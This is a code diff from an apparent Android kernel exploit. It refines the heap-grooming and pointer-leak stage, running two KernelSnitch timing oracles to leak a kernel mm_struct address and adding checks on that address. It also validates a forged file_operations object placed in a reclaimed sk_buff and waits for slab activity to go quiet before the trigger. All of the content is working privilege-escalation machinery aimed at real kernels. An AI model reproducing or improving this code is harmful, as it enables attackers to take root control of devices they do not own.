@@ -19,8 +19,10 @@
 #include <time.h>
 #include <unistd.h>
 
+#include "diag_checkpoint.h"
 #include "fops_install.h"
 #include "groom.h"
+#include "slabinfo.h"
 
 /* Debug instrumentation (H0): attribute the groom+install wall time to its
  * sub-phases (process spray, KernelSnitch collision search, bruteforce leak).
@@ -61,7 +63,12 @@ static long groom_env_long_clamped(const char *name, long fallback, long lo,
 #define OSS_SKB_SEND_SIZE FOPS_INSTALL_PAGE_SIZE         /* exact 0x8e80 */
 #define OSS_MM_PARTIALS 5
 #define OSS_KSNITCH_COLLISIONS 4
+#define OSS_KSNITCH_REPEAT 64
 #define OSS_SKB_RECLAIM_SENDS 64
+#define OSS_SKB_RECLAIM_MIN_FULL 48
+#define OSS_RECLAIM_QUIET_SAMPLE_MS 25
+#define OSS_RECLAIM_QUIET_STREAK 3
+#define OSS_RECLAIM_QUIET_MAX_SAMPLES 40
 
 struct mm_ctx {
   size_t mm_cnt;
@@ -90,6 +97,7 @@ static pid_t clone_child(void) {
 }
 
 static struct kernelsnitch_shared_state *g_ks;
+static struct kernelsnitch_shared_state *g_ks_verify;
 
 static pid_t clone_leak_child(void) {
   pid_t child = syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0);
@@ -99,6 +107,7 @@ static pid_t clone_leak_child(void) {
       _exit(1);
     }
     kernelsnitch_find_collisions(g_ks);
+    kernelsnitch_find_collisions(g_ks_verify);
     _exit(0);
   }
   return child;
@@ -201,6 +210,107 @@ static int pin_reclaim_to_cpu0(void) {
   return sched_setaffinity(0, sizeof(set), &set);
 }
 
+static uint64_t load_u64(const unsigned char *buf, size_t off) {
+  uint64_t value;
+  memcpy(&value, buf + off, sizeof(value));
+  return value;
+}
+
+static uint64_t fops_object_fingerprint(const unsigned char *buf) {
+  uint64_t hash = 1469598103934665603ULL;
+  for (size_t i = 0; i < FOPS_INSTALL_PAGE_SIZE; i++) {
+    hash ^= buf[i];
+    hash *= 1099511628211ULL;
+  }
+  return hash;
+}
+
+static int validate_fops_object(const unsigned char *buf,
+                                uint64_t aligned_base) {
+  return load_u64(buf, 0x2000) == 0 &&
+         load_u64(buf, 0x2008) == (aligned_base | 0x14e8ULL) &&
+         load_u64(buf, 0x2218) == (aligned_base | 0x14d0ULL) &&
+         load_u64(buf, 0x2220) == (aligned_base | 0x14d0ULL) &&
+         load_u64(buf, 0x2228) == 1;
+}
+
+static int validate_mm_candidate(uint64_t leaked, uint64_t *aligned_base,
+                                 size_t *object_index) {
+  if (leaked < KERNELSNITCH_IDENTITY_START ||
+      leaked >= KERNELSNITCH_IDENTITY_END ||
+      (leaked & (OSS_MM_STRUCT_SZ - 1)) != 0) {
+    return 0;
+  }
+  uint64_t base = leaked & ~(uint64_t)(OSS_ORDER3_SIZE - 1);
+  size_t index = (size_t)((leaked - base) / OSS_MM_STRUCT_SZ);
+  if ((base & (OSS_ORDER3_SIZE - 1)) != 0 || index >= 32) {
+    return 0;
+  }
+  *aligned_base = base;
+  *object_index = index;
+  return 1;
+}
+
+struct reclaim_slab_snapshot {
+  struct mm_slabinfo mm;
+  struct mm_slabinfo skb;
+  struct mm_slabinfo kmalloc4k;
+};
+
+static int read_reclaim_slabs(struct reclaim_slab_snapshot *out) {
+  return read_named_slabinfo("mm_struct", &out->mm) &&
+         read_named_slabinfo("skbuff_head_cache", &out->skb) &&
+         read_named_slabinfo("kmalloc-4k", &out->kmalloc4k);
+}
+
+static int slab_activity_equal(const struct mm_slabinfo *a,
+                               const struct mm_slabinfo *b) {
+  return a->active_objs == b->active_objs && a->num_objs == b->num_objs &&
+         a->active_slabs == b->active_slabs &&
+         a->num_slabs == b->num_slabs;
+}
+
+static int reclaim_slabs_equal(const struct reclaim_slab_snapshot *a,
+                               const struct reclaim_slab_snapshot *b) {
+  return slab_activity_equal(&a->mm, &b->mm) &&
+         slab_activity_equal(&a->skb, &b->skb) &&
+         slab_activity_equal(&a->kmalloc4k, &b->kmalloc4k);
+}
+
+static int wait_for_reclaim_quiet_window(int *samples_out) {
+  struct reclaim_slab_snapshot previous;
+  if (!read_reclaim_slabs(&previous)) {
+    return 0;
+  }
+  int streak = 0;
+  for (int sample = 1; sample <= OSS_RECLAIM_QUIET_MAX_SAMPLES; sample++) {
+    struct timespec delay = {
+        .tv_sec = 0,
+        .tv_nsec = OSS_RECLAIM_QUIET_SAMPLE_MS * 1000L * 1000L,
+    };
+    while (nanosleep(&delay, &delay) != 0 && errno == EINTR) {
+    }
+    struct reclaim_slab_snapshot current;
+    if (!read_reclaim_slabs(&current)) {
+      return 0;
+    }
+    streak = reclaim_slabs_equal(&previous, &current) ? streak + 1 : 0;
+    previous = current;
+    if (streak >= OSS_RECLAIM_QUIET_STREAK) {
+      *samples_out = sample;
+      fprintf(stderr,
+              "[groom] reclaim quiet pass samples=%d streak=%d "
+              "mm=%lu/%lu skb=%lu/%lu kmalloc4k=%lu/%lu\n",
+              sample, streak, current.mm.active_objs, current.mm.num_objs,
+              current.skb.active_objs, current.skb.num_objs,
+              current.kmalloc4k.active_objs, current.kmalloc4k.num_objs);
+      return 1;
+    }
+  }
+  *samples_out = OSS_RECLAIM_QUIET_MAX_SAMPLES;
+  return 0;
+}
+
 static uint64_t groom_and_install_fops_object_impl(
     uint64_t kernel_base, uint64_t ashmem_misc_fops_addr,
     uint64_t init_task_addr) {
@@ -283,9 +393,11 @@ static uint64_t groom_and_install_fops_object_impl(
     goto cleanup;
   }
   g_ks = kernelsnitch_setup(OSS_MM_STRUCT_SZ, OSS_MM_ORDER, cpu_count,
-                             OSS_KSNITCH_COLLISIONS, 0, 0);
-  if (!g_ks) {
-    fprintf(stderr, "[groom] kernelsnitch setup failed\n");
+                            OSS_KSNITCH_COLLISIONS, 0, 0);
+  g_ks_verify = kernelsnitch_setup(OSS_MM_STRUCT_SZ, OSS_MM_ORDER, cpu_count,
+                                   OSS_KSNITCH_COLLISIONS, 0, 0);
+  if (!g_ks || !g_ks_verify) {
+    fprintf(stderr, "[groom] kernelsnitch dual setup failed\n");
     goto cleanup;
   }
   {
@@ -294,13 +406,17 @@ static uint64_t groom_and_install_fops_object_impl(
     long ks_appended = groom_env_long_clamped(
         "KSNITCH_APPENDED", (long)g_ks->appended_futexes, 256, APPENDED_FUTEXES);
     long ks_repeat = groom_env_long_clamped(
-        "KSNITCH_REPEAT", (long)g_ks->repeat_measurement,
-        (long)g_ks->average, REPEAT_MEASUREMENT);
+        "KSNITCH_REPEAT", OSS_KSNITCH_REPEAT, OSS_KSNITCH_REPEAT,
+        REPEAT_MEASUREMENT);
     kernelsnitch_set_profile(g_ks, (size_t)ks_appended, (size_t)ks_repeat,
                               g_ks->average);
+    kernelsnitch_set_profile(g_ks_verify, (size_t)ks_appended,
+                              (size_t)ks_repeat, g_ks_verify->average);
     fprintf(stderr,
-            "[groom] ksnitch profile appended=%zu repeat=%zu average=%zu\n",
-            g_ks->appended_futexes, g_ks->repeat_measurement, g_ks->average);
+            "[groom] ksnitch profile oracles=2 appended=%zu repeat=%zu "
+            "average=%zu confirmations=%zu\n",
+            g_ks->appended_futexes, g_ks->repeat_measurement, g_ks->average,
+            g_ks->collision_confirmations);
   }
   groom_dbg("ksnitch-setup", dbg_t0, &dbg_last);
 
@@ -371,28 +487,67 @@ static uint64_t groom_and_install_fops_object_impl(
   child_leak = -1;
   groom_dbg("find-collisions-done", dbg_t0, &dbg_last); /* 4096-thread append + scan */
 
-  if (!kernelsnitch_found_collisions(g_ks)) {
-    fprintf(stderr, "[groom] kernelsnitch collision finding failed\n");
+  int primary_collisions = kernelsnitch_found_collisions(g_ks);
+  int verify_collisions = kernelsnitch_found_collisions(g_ks_verify);
+  fprintf(stderr,
+          "[groom] ksnitch oracle=primary baseline=%zu threshold=%zu "
+          "min=%zu confirmed=%zu pass=%d\n",
+          g_ks->collision_baseline, g_ks->collision_threshold,
+          g_ks->collision_min_time, g_ks->confirmed_collisions,
+          primary_collisions);
+  fprintf(stderr,
+          "[groom] ksnitch oracle=verify baseline=%zu threshold=%zu "
+          "min=%zu confirmed=%zu pass=%d\n",
+          g_ks_verify->collision_baseline, g_ks_verify->collision_threshold,
+          g_ks_verify->collision_min_time, g_ks_verify->confirmed_collisions,
+          verify_collisions);
+  if (!primary_collisions || !verify_collisions) {
+    fprintf(stderr, "[groom] kernelsnitch dual collision finding failed\n");
     goto cleanup;
   }
 
   kernelsnitch_bruteforce(g_ks);
+  kernelsnitch_bruteforce(g_ks_verify);
   uint64_t leaked = g_ks->mm_struct;
-  if (leaked == (uint64_t)-1) {
-    fprintf(stderr, "[groom] kernelsnitch mm_struct leak failed\n");
+  uint64_t verified_leak = g_ks_verify->mm_struct;
+  if (leaked == (uint64_t)-1 || verified_leak == (uint64_t)-1 ||
+      leaked != verified_leak) {
+    fprintf(stderr,
+            "[groom] kernelsnitch dual leak rejected primary=%016llx "
+            "verify=%016llx\n",
+            (unsigned long long)leaked, (unsigned long long)verified_leak);
     goto cleanup;
   }
-  groom_dbg("bruteforce-done", dbg_t0, &dbg_last); /* 8-thread timing leak */
+  groom_dbg("bruteforce-done", dbg_t0, &dbg_last); /* dual timing leak */
 
   /* Closed FUN_00106288 derives every kernel pointer from A directly:
    * A = candidate & ~0x7fff. The skb user-data starts at D=A-0xe80, so
    * scratch+0x2000 lands at A+0x1180; D must not replace A in pointers. */
-  uint64_t aligned_base = leaked & ~(uint64_t)(OSS_ORDER3_SIZE - 1);
-  fprintf(stderr, "[groom] mm leaked=%016llx aligned_base=%016llx\n",
-          (unsigned long long)leaked, (unsigned long long)aligned_base);
+  uint64_t aligned_base = 0;
+  size_t object_index = 0;
+  if (!validate_mm_candidate(leaked, &aligned_base, &object_index)) {
+    fprintf(stderr, "[groom] mm candidate geometry rejected leaked=%016llx\n",
+            (unsigned long long)leaked);
+    goto cleanup;
+  }
+  fprintf(stderr,
+          "[groom] mm leaked=%016llx aligned_base=%016llx object_index=%zu "
+          "dual_match=1\n",
+          (unsigned long long)leaked, (unsigned long long)aligned_base,
+          object_index);
 
   build_fops_install_object(skb_buf, aligned_base, kernel_base,
                              ashmem_misc_fops_addr, init_task_addr);
+  uint64_t object_hash = fops_object_fingerprint(skb_buf);
+  if (!validate_fops_object(skb_buf, aligned_base)) {
+    fprintf(stderr,
+            "[groom] local fake fops validation failed hash=%016llx\n",
+            (unsigned long long)object_hash);
+    goto cleanup;
+  }
+  fprintf(stderr,
+          "[groom] local fake fops owner=0 layout=pass hash=%016llx\n",
+          (unsigned long long)object_hash);
 
   if (socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv) != 0) {
     fprintf(stderr, "[groom] reclaim socketpair failed errno=%d\n", errno);
@@ -404,6 +559,18 @@ static uint64_t groom_and_install_fops_object_impl(
     fprintf(stderr, "[groom] SO_SNDBUF failed errno=%d\n", errno);
     goto cleanup;
   }
+  int effective_sndbuf = 0;
+  socklen_t effective_sndbuf_len = sizeof(effective_sndbuf);
+  if (getsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &effective_sndbuf,
+                 &effective_sndbuf_len) != 0 || effective_sndbuf < sndbuf) {
+    fprintf(stderr,
+            "[groom] SO_SNDBUF effective rejected request=%d effective=%d "
+            "errno=%d\n",
+            sndbuf, effective_sndbuf, errno);
+    goto cleanup;
+  }
+  fprintf(stderr, "[groom] SO_SNDBUF request=%d effective=%d\n", sndbuf,
+          effective_sndbuf);
   int flags = fcntl(reclaim_sv[0], F_GETFL, 0);
   if (flags < 0 || fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK) != 0) {
     fprintf(stderr, "[groom] reclaim nonblock failed errno=%d\n", errno);
@@ -520,12 +687,30 @@ static uint64_t groom_and_install_fops_object_impl(
           "[groom] mm drain triggers=%zu sk_buff reclaim sends=%d/%d\n",
           drain_triggers, reclaim_sent, OSS_SKB_RECLAIM_SENDS);
 
-  if (reclaim_sent == 0 || reclaim_incomplete) {
+  long reclaim_min = groom_env_long_clamped(
+      "RMG_RECLAIM_MIN_FULL", OSS_SKB_RECLAIM_MIN_FULL,
+      OSS_SKB_RECLAIM_MIN_FULL, OSS_SKB_RECLAIM_SENDS);
+  if (reclaim_sent < reclaim_min || reclaim_incomplete) {
     fprintf(stderr,
-            "[groom] reclaim batch rejected full=%d incomplete=%d\n",
-            reclaim_sent, reclaim_incomplete);
+            "[groom] reclaim batch rejected full=%d minimum=%ld "
+            "incomplete=%d\n",
+            reclaim_sent, reclaim_min, reclaim_incomplete);
     goto cleanup;
   }
+
+  int quiet_samples = 0;
+  if (!wait_for_reclaim_quiet_window(&quiet_samples)) {
+    fprintf(stderr,
+            "[groom] reclaim quiet window rejected samples=%d required=%d\n",
+            quiet_samples, OSS_RECLAIM_QUIET_STREAK);
+    goto cleanup;
+  }
+  char checkpoint[160];
+  snprintf(checkpoint, sizeof(checkpoint),
+           "groom-pretrigger leak=%016llx idx=%zu sends=%d quiet=%d hash=%016llx",
+           (unsigned long long)leaked, object_index, reclaim_sent,
+           quiet_samples, (unsigned long long)object_hash);
+  oss_diag_checkpoint(checkpoint);
 
   groom_dbg("drain-reclaim-done", dbg_t0, &dbg_last); /* build+socketpair+drain+reclaim */
 
@@ -538,6 +723,10 @@ cleanup:
   if (g_ks) {
     kernelsnitch_cleanup(g_ks);
     g_ks = NULL;
+  }
+  if (g_ks_verify) {
+    kernelsnitch_cleanup(g_ks_verify);
+    g_ks_verify = NULL;
   }
   if (child_leak > 0) {
     kill_child(child_leak);
